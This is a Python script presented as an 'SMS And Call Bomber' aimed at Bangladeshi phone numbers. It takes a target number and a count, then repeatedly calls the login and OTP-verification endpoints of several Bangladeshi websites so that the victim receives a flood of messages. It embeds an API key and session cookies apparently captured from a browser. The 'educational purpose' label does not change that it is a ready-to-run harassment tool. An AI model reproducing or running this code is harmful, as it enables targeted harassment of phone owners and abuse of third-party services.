import os
import time 
import requests
import sys

# ✅ Function for animated printing
def animated_print(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

# ✅ Clear screen before starting
def clear_screen():
    os.system("clear")

while True:
    clear_screen()
    
    print("\n\n\n")
    animated_print("\t\t\033[1;33mSystem Loading...\033[0m\n", 0.1)
    time.sleep(1.8)
    clear_screen()
    
    print("\n\n\n")
    animated_print("\t\033[1;32mSuccessfully Loaded. Thanks For Waiting.\033[0m\n", 0.1)
    time.sleep(1.8)

    while True:       
        clear_screen()
        
        logo = """
\033[1;34m================================================

 \t\033[1;36m _____  _____ ________      _______  
 \t|  __ \\|_   _|___  /\\ \\    / /_   _| 
 \t| |__) | | |    / /  \\ \\  / /  | |   
 \t|  _  /  | |   / /    \\ \\/ /   | |   
 \t| | \\ \\ _| |_ / /__    \\  /   _| |_  
 \t|_|  \\_\\_____/_____|    \\/   |_____| 







       Author   : Rizvi Ahmed
       Facebook : Unknown 
       Github   : Unknown 
       Group    : Unknown

  Use the tool for Educational Purpose

\033[1;34m================================================\033[0m
"""
        animated_print(logo, 0.02)

        first_line = """\033[1;32m
------------------------------------------------
|                                              |
|    SMS And Call Bomber For Only Bangladeshi  |
|                                              |
------------------------------------------------\n\n\033[0m"""
        animated_print(first_line, 0.01)

        # Break the loop after displaying once
        break  # 🔁 Remove or customize this based on next action
    break  # 🔁 Remove this if you want the outer loop to continue



def header(text, delay):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)



num = input("\tEnter target number : ")
am = int(input("\tEnter Ammount : "))

sent = 0 

while sent<am:
    r = requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login?phone='+num)
   
    if r.status_code == 200:
        sent+=1
        print(f"\n\033[1;33m{sent} message sent successfully  ")
    else:
        pass


    headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
    'Connection': 'keep-alive',
    'Content-type': 'application/json',
    'Origin': 'https://app.quizgiri.com.bd',
    'Referer': 'https://app.quizgiri.com.bd/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'dnt': '1',
    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-gpc': '1',
    'x-api-key': 'gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G',
    }

    params = {
    'num': 'num',
    }

    r = requests.get('https://developer.quizgiri.xyz/api/v2.0/is-profile-completed', params=params, headers=headers)

    if r.status_code == 200:
        sent+=1
        print(f"\n\033[1;33m{sent} message sent successfully  ")
    else:
        pass

    cookies = {
    'userActTraSerBrowId': 'be42ba0e-d192-4175-91c2-54d23a2ef38c',
    'sururl': 'L2Jvb2s=',
    'JSESSIONID': 'bfc06ada-02f6-4122-91bb-889a1f3c824e',
    'userActTraSerSessId': '9a73b184-f5c5-4f59-ae2d-a13e1732c374',
    'nt_req_con_indx': '["nt_all_index"]',
    'nt_pop_shown': '["nt_all_pop_shown"]',
    'cf_clearance': 'u8qZ2gAAi7FBFE6lFMwx0XbF9pSpTDqiVlcviYFS83A-1754501003-1.2.1.1-JbyR82trg3S0ZnnK3qjlPLwYrVElyp1nIEYpS6CDRMhXK7Q0.AOZpuVoe4u9Yiiz_AAyGoAvv.By1Yx94y3KhvzhkqD8iSMDmL4Sfil3fJOR2.5aoWFsIx6rFpsGOQ94qym5Tds4BGpSn1Yuq.ocpaXCMWU8001WWlvxo6yl9YB7mDcixhRZXm4yxlLc5NamotkPp_PwTHt5VBqIuTk2jyMkTqxTwo4JKFr43.lTJHA',
    }

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
    'dnt': '1',
    'priority': 'u=1, i',
    'referer': 'https://www.rokomari.com/login',
    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    params = {
    'num': 'num',
    }

    r = requests.get('https://www.rokomari.com/login/check', params=params, cookies=cookies, headers=headers)
    if r.status_code == 200:
        sent+=1
        print(f"\n\033[1;33m{sent} message sent successfully  ")
    else:
        pass





